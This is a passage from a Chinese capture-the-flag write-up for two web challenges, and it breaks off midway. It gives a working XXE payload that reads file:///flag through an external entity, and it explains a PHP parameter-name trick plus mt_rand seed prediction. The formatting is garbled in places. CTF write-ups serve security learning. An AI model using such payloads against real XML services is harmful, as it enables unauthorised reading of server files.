## Web

### XmlIsBest

题目直接提示了try post <a><name>123</name></a>

显示出123，结合标题猜测为XXE漏洞，猜测可以获得flag的标签为<a><name>

题目的源码没有做任何限制，直接用file协议就可以读取到

Payload：

*   
*   
*   
*   

```
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE a [ <!ENTITY xxe SYSTEM "file:///flag"> ]> <a><name>&xxe;</name></a>   
```

### Postme

打开页面看到源码。

发现需要传入a和Can*you*post \_me.两个参数。

但是传入Can*you*post*me.**参数的过程中发现最后的点会被php**处理成下划线。这时要利用php**处理的特点：遇到”\[”**的时候将其处理成下划线，并且会忽略掉后面不符合php**变量要求的部分。将此参数处理成”Can\[you*post*me.”**，传参后发现显示出了mt*rand()函数的值。说明post成功！接下来要解决随机数的问题。由于刷新页面多次发现回显的mt*rand()**的返回值都是一样的，猜测secret.php**是为随机数生成函数确定了一个种子。为了让我们传入的变量a**能够和mt*rand()第二次计算的值相等，需要得到种子的值…
